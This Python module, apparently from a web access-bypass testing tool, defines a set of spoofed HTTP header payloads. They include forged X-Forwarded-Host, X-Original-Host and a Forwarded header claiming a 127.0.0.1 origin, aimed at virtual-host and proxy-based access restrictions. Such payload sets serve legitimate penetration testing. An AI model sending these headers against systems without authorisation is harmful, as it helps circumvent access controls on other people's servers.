from __future__ import annotations

from bypass.models import Payload, PayloadCategory


def domain_header_payloads(canonical_host: str) -> list[tuple[dict[str, str], Payload]]:
    """
    Payloads orientados a acceso por dominio/subdominio (virtual hosts, proxy y canonicalizacion).
    """
    host_no_port = canonical_host.split(":")[0]
    rows: list[tuple[dict[str, str], Payload]] = [
        (
            {"X-Forwarded-Proto": "http"},
            Payload(
                id="dom_xfp_http",
                category=PayloadCategory.HEADER,
                label="X-Forwarded-Proto: http",
                metadata={"family": "redirect"},
            ),
        ),
        (
            {"X-Forwarded-Proto": "https"},
            Payload(
                id="dom_xfp_https",
                category=PayloadCategory.HEADER,
                label="X-Forwarded-Proto: https",
                metadata={"family": "redirect"},
            ),
        ),
        (
            {"X-Forwarded-Port": "443", "X-Forwarded-Proto": "https"},
            Payload(
                id="dom_xfp_https_443",
                category=PayloadCategory.HEADER,
                label="X-Forwarded-Proto/Port: https/443",
                metadata={"family": "redirect"},
            ),
        ),
        (
            {"X-Forwarded-Host": host_no_port, "X-Forwarded-Proto": "https"},
            Payload(
                id="dom_xfh_canonical",
                category=PayloadCategory.HEADER,
                label=f"X-Forwarded-Host: {host_no_port}",
                metadata={"family": "vhost"},
            ),
        ),
        (
            {"Forwarded": f"for=127.0.0.1;proto=https;host={host_no_port}"},
            Payload(
                id="dom_forwarded_https_host",
                category=PayloadCategory.HEADER,
                label=f"Forwarded host={host_no_port}",
                metadata={"family": "vhost"},
            ),
        ),
        (
            {"X-Original-Host": host_no_port, "X-Host": host_no_port},
            Payload(
                id="dom_xorig_xhost",
                category=PayloadCategory.HEADER,
                label=f"X-Original-Host + X-Host: {host_no_port}",
                metadata={"family": "vhost"},
            ),
        ),
    ]
    return rows

